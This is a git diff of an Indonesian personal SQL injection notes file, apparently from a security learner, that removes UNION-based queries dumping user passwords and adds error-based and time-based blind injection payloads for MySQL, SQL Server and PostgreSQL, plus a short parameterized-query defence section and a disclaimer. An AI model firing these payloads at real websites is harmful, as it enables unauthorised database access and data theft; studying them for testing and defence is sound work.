@@ -2,7 +2,7 @@
 
 > "Dari tahun 1998 sampe 2026, SQL Injection masih jadi jalan tolnya para hacker pemula buat masuk ke database."
 
-Dokumentasi pribadi yang tak kumpulin dari hasil *bug hunting*, CTF, dan eksplorasi dunia *cyber security* selama 2025-2026. Bukan buat iseng ngerusak, tapi buat nge-test sistem yang emang udah dikasih izin (*penetration testing legal*) dan buat *reminder* diri sendiri kalo *developer* tuh sering banget lupa sanitasi.
+Dokumentasi pribadi yang tak kumpulin dari hasil *bug hunting*, CTF, dan eksplorasi dunia *cyber security* selama 2025-2026. Bukan buat iseng ngerusak, tapi buat nge-test sistem yang emang udah dikasih izin (*penetration testing legal*) dan buat *reminder* diri sendiri/ lu semua inget kalo *developer* tuh sering banget lupa sanitasi.
 
 ---
 
@@ -20,7 +20,7 @@ Dulu gw kira SQL Injection tuh cuma sekedar `admin' or '1'='1` buat *bypass* log
 
 ## ⚠️ Dampak Nyata SQL Injection (Bukan Cuma Teori)
 
-Gue kasih gambaran konsekuensi yang udah terjadi di dunia nyata, biar makin paham kenapa kerentanan ini masuk kategori *high/critical risk*:
+Gw kasih gambaran konsekuensi yang udah terjadi di dunia nyata, biar makin paham kenapa kerentanan ini masuk kategori *high/critical risk*:
 
 | Dampak | Contoh Kasus Nyata |
 | :--- | :--- |
@@ -33,7 +33,7 @@ Gue kasih gambaran konsekuensi yang udah terjadi di dunia nyata, biar makin paha
 
 ## 🔍 Teknik SQL Injection Paling "Nendang" (Top 2026)
 
-Nih gue kumpulin payload-payload yang paling *hits* di tahun 2026, berdasarkan pengalaman gue *pentest* dan riset dari forum-forum *underground* etis.
+Nih gw kumpulin payload-payload yang paling *umum" berdasarkan pengalaman *pentest* .
 
 ### 1. Klasik Abadi — Login Bypass (Tanpa Password)
 Ini yang paling sering dicoba duluan, soalnya kalo berhasil, lo udah dapet akses admin cuma dalam 5 detik.
@@ -54,25 +54,62 @@ Tips 2026: Sekarang banyak WAF (Web Application Firewall) yang udah pinter nge-d
 ```
 ---
 
-### 2. Klasik Abadi — Login Bypass (Tanpa Password)
-Kalo lo udah tau jumlah kolom di tabel asli, lo bisa pake UNION buat nyomot data dari tabel lain (misal tabel users).
-
-Langkah pertama: Cari tau jumlah kolom pake ORDER BY sampai muncul error.
+### 2. Error-Based SQLi (eror sql)
+Ini easy banget soalnya diweb biasa muncul sql eror syntax lengkap + query sql, dari situ bisa tau struktur tabel, bahkan sampe nama kolom.
 
 ```SQL
-' ORDER BY 1 -- 
-' ORDER BY 2 -- 
-' ORDER BY 3 -- 
--- Sampe muncul error, berarti jumlah kolom = (angka sebelum error)
-setelah tau kolom tinggal make UNION SELECT:
+' AND 1=CONVERT(int, @@version) --  (Buat SQL Server)
+' AND extractvalue(1, concat(0x7e, database())) --  (Buat MySQL)
+' AND updatexml(1, concat(0x7e, version()), 1) -- 
+Output yang diharapkan: Error nampilin nama database, versi, atau path folder. Dari situ lu udah bisa petakan infrastruktur mereka.
 
-```SQL
-' UNION SELECT NULL -- 
-' UNION SELECT NULL,NULL -- 
-' UNION SELECT NULL,NULL,NULL -- 
-Kalo udah tau jumlah kolom (misal 3), tinggal dump datanya:
+```
 
-```SQL
-' UNION SELECT id, username, password FROM users -- 
-' UNION SELECT null, name, pass FROM admin -- 
-Di 2026, Union-based masih jadi andalan karena response-nya langsung kelihatan di halaman web. Tinggal cocokin posisi kolom yang ditampilin.
+### 3.Blind SQLi & Time Sqli
+Ini lebih challenging soalnya gak ada error yang keluar. Lo harus bedain respon "halaman normal" vs "halaman kosong" atau "delay waktu".
+
+```Time-Based Blind (Pake Delay):
+
+SQL
+' AND SLEEP(5) --  (MySQL)
+' WAITFOR DELAY '0:0:5' --  (SQL Server)
+' AND pg_sleep(5) --  (PostgreSQL)
+Kalo halaman loading 5 detik, berarti query lo dieksekusi. Itu artinya SQLi-nya ada.
+
+SQL
+'--
+'--+-
+'--+
+kalau petik ' blank, tinggal nambahin komen --+ buat cek apakah tampil normal, kalau berbeda response berarti fix blind sqli
+
+```
+🔐 Cara Aman (Buat Developer)
+
+Buat dev yang ngerjain projek ngoding, jangan cuma ngandelin WAF doang. Ini 1 pilar utama yang wajib ada:
+
+```Parameterized Query / Prepared Statements (Wajib!)
+Ini yang paling ampuh, jadi query dan data dipisah secara logic.
+
+Python
+# Contoh Python (Pake parameterized query)
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, pass))
+
+Least Privilege Principle
+User database jangan dikasih akses admin/root, cukup read/write sesuai kebutuhan fitur aja.
+```
+
+🌐 Sumber Belajar & Referensi
+
+PortSwigger Web Security Academy — Lab SQLi gratis, komplit banget (minus harus jago bahasa Inggris).
+
+PayloadsAllTheThings (GitHub) — Kumpulan payload dari berbagai macam injeksi.
+
+OWASP SQL Injection Prevention Cheat Sheet — Standar industri buat pertahanan web.
+
+✍️ Pesan & Catatan
+
+Di 2026, SQL Injection tetep jadi masalah utama di dunia web. Kenapa? Karena banyak web app dari startup, web pemerintah, sekolah-sekolah, atau institusi pendidikan yang dibangun dari tahun 2000-an (kode warisan) di mana mereka takut ngelakuin perubahan kode ke yang lebih aman cuma karena takut error. Padahal SQLi ini masalah yang bener-bener real.
+
+Jadi buat gw/kalian yang mau jadi security researcher: Jangan pernah berhenti belajar SQLi. Tekniknya emang udah tua, tapi sampe sekarang masih banyak yang kena. Buktinya, hampir tiap bulan ada aja berita bocor data gara-gara query yang gak di-prepare.
+
+Disclaimer: "Dokumentasi ini cuma buat pembelajaran dan pengujian sistem yang sudah punya izin tertulis. Penyalahgunaan di luar ranah etis adalah tanggung jawab masing-masing."
